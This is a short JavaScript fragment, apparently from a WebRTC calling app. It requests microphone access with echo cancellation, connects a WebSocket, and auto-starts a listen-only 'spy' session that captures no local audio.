  // Pre-unlock audio/video elements during user gesture
  remoteVid.play().catch(() => {});
  remoteAud.play().catch(() => {});

  await fetchIceServers();

  if (!isSpy) {
    try {
      // Audio only first
      localStream = await navigator.mediaDevices.getUserMedia({
        audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true, sampleRate: { ideal: 48000 }, channelCount: 1 }
      });
    } catch (e) {
      console.error('Audio denied:', e);
      localStream = new MediaStream(); // empty stream, continue
    }
  }

  connectWS();
  schedHide();
}

// Auto-start for spy
if (isSpy) startSession();
